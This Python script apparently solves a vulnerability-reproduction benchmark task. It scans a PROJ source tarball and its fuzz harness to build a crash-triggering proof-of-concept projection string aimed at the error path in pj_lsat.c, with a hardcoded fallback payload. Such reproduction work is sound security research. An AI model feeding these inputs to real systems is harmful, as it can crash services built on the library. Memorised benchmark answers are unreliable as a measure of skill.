import os
import re
import tarfile
from typing import Optional, Dict, Tuple


class Solution:
    def _read_member_text(self, tf: tarfile.TarFile, member: tarfile.TarInfo) -> str:
        f = tf.extractfile(member)
        if f is None:
            return ""
        try:
            data = f.read()
        finally:
            f.close()
        return data.decode("utf-8", "ignore")

    def _find_pj_lsat(self, tf: tarfile.TarFile) -> Optional[str]:
        best = None
        for m in tf.getmembers():
            if not m.isfile():
                continue
            base = os.path.basename(m.name).lower()
            if base == "pj_lsat.c":
                best = m
                break
        if best is None:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                base = os.path.basename(m.name).lower()
                if base.endswith("pj_lsat.c"):
                    best = m
                    break
        if best is None:
            return None
        return self._read_member_text(tf, best)

    def _find_fuzzer_source(self, tf: tarfile.TarFile) -> Optional[str]:
        exts = {".c", ".cc", ".cpp", ".cxx"}
        candidates = []
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            base = os.path.basename(name)
            ext = os.path.splitext(base)[1].lower()
            if ext not in exts:
                continue
            if m.size <= 0 or m.size > 512 * 1024:
                continue
            bl = base.lower()
            if "fuzz" in bl or "fuzzer" in bl or "llvmfuzzer" in bl:
                candidates.append(m)
        members = candidates if candidates else [m for m in tf.getmembers() if m.isfile() and os.path.splitext(m.name)[1].lower() in exts and 0 < m.size <= 512 * 1024]

        for m in members:
            txt = self._read_member_text(tf, m)
            if "LLVMFuzzerTestOneInput" in txt:
                return txt
        return None

    def _extract_if_condition(self, line: str) -> Optional[str]:
        idx = line.find("if")
        if idx < 0:
            return None
        p = line.find("(", idx)
        if p < 0:
            return None
        depth = 0
        for i in range(p, len(line)):
            c = line[i]
            if c == "(":
                depth += 1
            elif c == ")":
                depth -= 1
                if depth == 0:
                    return line[p + 1 : i].strip()
        return None

    def _parse_var_to_param(self, content: str) -> Dict[str, str]:
        var_to_param: Dict[str, str] = {}
        # Example: lsat = pj_param(P->ctx, P->params, "ilsat").i;
        pat = re.compile(
            r'\b([A-Za-z_][A-Za-z0-9_]*)\s*=\s*pj_param\s*\([^;]*?,\s*"([A-Za-z])([A-Za-z0-9_]+)"\s*\)\s*\.\s*([A-Za-z_][A-Za-z0-9_]*)',
            re.MULTILINE,
        )
        for m in pat.finditer(content):
            var = m.group(1)
            pname = m.group(3)
            var_to_param[var] = pname
        return var_to_param

    def _choose_invalid_value(self, cond: str, var: str) -> int:
        c = cond
        c = c.replace("\t", " ")
        parts = [p.strip() for p in c.split("||") if p.strip()]
        terms = parts if parts else [c.strip()]
        for term in terms:
            if re.search(rf'!\s*\b{re.escape(var)}\b', term):
                return 0
            m = re.search(rf'\b{re.escape(var)}\b\s*==\s*(-?\d+)', term)
            if m:
                return int(m.group(1))
            m = re.search(rf'\b{re.escape(var)}\b\s*!=\s*(-?\d+)', term)
            if m:
                return int(m.group(1)) + 1
            m = re.search(rf'\b{re.escape(var)}\b\s*<=\s*(-?\d+)', term)
            if m:
                return int(m.group(1))
            m = re.search(rf'\b{re.escape(var)}\b\s*<\s*(-?\d+)', term)
            if m:
                n = int(m.group(1))
                if n > 0:
                    return 0
                return n - 1
            m = re.search(rf'\b{re.escape(var)}\b\s*>=\s*(-?\d+)', term)
            if m:
                return int(m.group(1))
            m = re.search(rf'\b{re.escape(var)}\b\s*>\s*(-?\d+)', term)
            if m:
                return int(m.group(1)) + 1

        return 0

    def _find_bug_condition(self, content: str, var_to_param: Dict[str, str]) -> Tuple[Optional[str], Optional[str]]:
        lines = content.splitlines()
        buggy_idx = None
        for i, line in enumerate(lines):
            if "pj_default_destructor" in line:
                if re.search(r"\breturn\b", line):
                    continue
                buggy_idx = i
                break
        if buggy_idx is None:
            return None, None

        cond = None
        if "if" in lines[buggy_idx]:
            cond = self._extract_if_condition(lines[buggy_idx])

        if cond is None:
            for j in range(buggy_idx - 1, max(-1, buggy_idx - 25), -1):
                if "if" in lines[j] and "(" in lines[j]:
                    cc = self._extract_if_condition(lines[j])
                    if cc:
                        cond = cc
                        break

        if not cond:
            return None, None

        chosen_var = None
        for v in var_to_param.keys():
            if re.search(rf"\b{re.escape(v)}\b", cond):
                chosen_var = v
                break
        if chosen_var is None:
            return cond, None
        return cond, chosen_var

    def _select_param_names(self, var_to_param: Dict[str, str]) -> Tuple[str, str]:
        params = set(var_to_param.values())
        sat_param = None
        path_param = None

        for p in params:
            pl = p.lower()
            if "path" in pl:
                path_param = p
            if "lsat" in pl:
                sat_param = p

        if sat_param is None:
            for p in params:
                pl = p.lower()
                if pl == "sat" or pl.endswith("sat") or "sat" in pl:
                    sat_param = p
                    break

        if path_param is None:
            for p in params:
                pl = p.lower()
                if pl == "path":
                    path_param = p
                    break

        if sat_param is None:
            sat_param = "lsat"
        if path_param is None:
            path_param = "path"
        return sat_param, path_param

    def _needs_nul_split_input(self, fuzzer_src: Optional[str]) -> bool:
        if not fuzzer_src:
            return False
        s = fuzzer_src
        if "memchr" in s and re.search(r"memchr\s*\(\s*data\s*,\s*0\s*,", s):
            return True
        if "'\\0'" in s or "\"\\0\"" in s or "\\x00" in s:
            if "data" in s:
                return True
        if re.search(r"find\s*\(\s*'\\0'\s*\)", s):
            return True
        return False

    def solve(self, src_path: str) -> bytes:
        default_poc = b"+proj=lsat +lsat=1 +path=0 +a=1 +b=1"

        try:
            with tarfile.open(src_path, "r:*") as tf:
                pj_lsat = self._find_pj_lsat(tf)
                fuzzer_src = self._find_fuzzer_source(tf)

                if not pj_lsat:
                    return default_poc

                var_to_param = self._parse_var_to_param(pj_lsat)
                sat_param, path_param = self._select_param_names(var_to_param)

                cond, var = self._find_bug_condition(pj_lsat, var_to_param)
                invalid_param = None
                invalid_val = 0

                if cond and var and var in var_to_param:
                    invalid_param = var_to_param[var]
                    invalid_val = self._choose_invalid_value(cond, var)

                if invalid_param is None:
                    invalid_param = path_param
                    invalid_val = 0

                sat_val = 1
                path_val = 1
                if invalid_param.lower() == sat_param.lower():
                    sat_val = invalid_val
                if invalid_param.lower() == path_param.lower():
                    path_val = invalid_val

                proj = f"+proj=lsat +{sat_param}={sat_val} +{path_param}={path_val} +a=1 +b=1".encode("ascii", "ignore")

                if self._needs_nul_split_input(fuzzer_src):
                    src_crs = b"EPSG:4326"
                    return src_crs + b"\x00" + proj + b"\x00"

                return proj
        except Exception:
            return default_poc